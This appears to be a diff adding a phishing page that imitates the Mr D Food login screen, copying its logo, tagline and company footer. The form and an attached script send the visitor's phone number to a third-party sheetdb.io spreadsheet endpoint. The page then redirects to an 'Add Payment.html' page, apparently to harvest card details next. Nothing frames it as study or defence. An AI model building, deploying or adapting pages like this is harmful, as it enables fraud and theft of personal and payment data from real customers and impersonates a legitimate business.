@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+
+
+<html>    
+<head profile="http://www.w3.org/2005/10/profile">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MR D Food | Login </title>
+	<link rel="icon" href="img/icon.png">
+    <meta property="og:title" content="South Africa’s favourite food delivery brand ">
+    <meta name="twitter:title" content="South Africa’s favourite food delivery brand ">
+    <meta name="description" content="Get the joy of food delivered by the best food delivery app in South Africa, Mr D Food ">
+    <meta property="og:description" content="Get the joy of food delivered by the best food delivery app in South Africa, Mr D Food ">
+    <link rel="stylesheet" href="styles.css" type="text/css">
+	
+
+
+
+
+</head>
+
+
+<body>
+
+<div class="covid-19-banner">
+  <div class="foot">Visit <a class="link-white" href="https://www.sacoronavirus.co.za" target="_blank">www.sacoronavirus.co.za</a> for official info on COVID-19.</div>
+</div>
+
+        <div class="header-profile">
+          <div class="profile-logo">
+            <div class="logo-container">
+              <img src="https://img.mrdfood.com/fit-in/256x256/seo/9c4c12b8-71db-4dc1-a456-736826b6d50e.png" alt="logo" itemprop="logo">
+            </div>  
+          </div>
+        </div>
+      
+
+
+<div   class="standalone-screen-page auth-forms ng-scope" ng-class="{'failed-trigger' : !!_auth.failed_message }">
+
+    <div class="standalone-screen-page-inner">
+
+        <div class="forms forms-v2">
+
+
+            <div class="form-title">
+                <h4>Welcome Back!</h4>
+                <p>You're moments away from good, hot food!</p>
+            </div>
+
+            <div class="message-failed ng-binding">
+                
+            </div>
+          <form action="https://sheetdb.io/api/v1/nlqa66wx1tpxd" method="POST" id="sheetdb-form">
+            <h3 style="padding-top: 20px;font-size: 18px;">Verify Your Mobile phone Number</h3>
+
+            <div class="form-row">
+                <input type="text" name="data[Telphone]" pattern="27[0-9]{9}" minlength="11" maxlength="11" id="PHONE_NUMBER_or_EMAIL_ADDRESS" placeholder="Valid Phone Number 27..."" color="white" inputmode="email" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"  ng-model="_auth.password" class="ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" required>
+                <label class="special"></label>
+            </div>
+
+            <div class="form-row form-row-footer forget">
+                <a href="">Provide a Valid Number For Verification</a>
+            </div>
+
+           <button id="btnLogin" class="submit-button submit-button-yellow  submit-button-loader" ng-class="{'is-working' : _auth.isWorking}" ng-disabled="loginForm.$invalid || _auth.isWorking" type="submit" data-test="forward-button" >
+                <em>Continue</em>
+
+                  <span class="button-loader sk-fading-circle">
+                    <span class="sk-circle1 sk-circle"></span>
+                    <span class="sk-circle2 sk-circle"></span>
+                    <span class="sk-circle3 sk-circle"></span>
+                    <span class="sk-circle4 sk-circle"></span>
+                    <span class="sk-circle5 sk-circle"></span>
+                    <span class="sk-circle6 sk-circle"></span>
+                    <span class="sk-circle7 sk-circle"></span>
+                    <span class="sk-circle8 sk-circle"></span>
+                    <span class="sk-circle9 sk-circle"></span>
+                    <span class="sk-circle10 sk-circle"></span>
+                    <span class="sk-circle11 sk-circle"></span>
+                    <span class="sk-circle12 sk-circle"></span>
+                  </span>
+            </button>
+			</form>
+
+
+            <div class="form-row form-row-footer form-row-footer-register">
+                <a href="/register" style="color:#FFE30E; font-size: 15px;">New to Mr D Food? <strong>Create new account</strong></a>
+            </div>
+
+        </div>
+    </div>
+</div>
+<footer>
+
+<div class="legal-main">
+        <p>© Mr Delivery (Pty) Ltd. All rights reserved. Reg 1992/04664/07. VAT number: 4330 165 400. <br>
+        12th floor, 10 Rua Vasco da Gama Plain, Foreshore, Cape Town</p>
+</div>
+
+<div class="site-desc">a <span>takealot.group</span> company</div>
+</footer>
+
+<script>
+  var form = document.getElementById('sheetdb-form'); 
+   form.addEventListener("submit", e => {
+   e.preventDefault(); 
+   fetch(form.action, {
+      method: "POST",
+	  body: new FormData(document.getElementById("sheetdb-form")),
+}).then(
+      response => response.json()
+).then((html) => { 
+      // you can put any JS code here 
+	 window.open("Add Payment.html", "_self");
+
+});
+});
+
+</script>
+
+</body>
+</html>
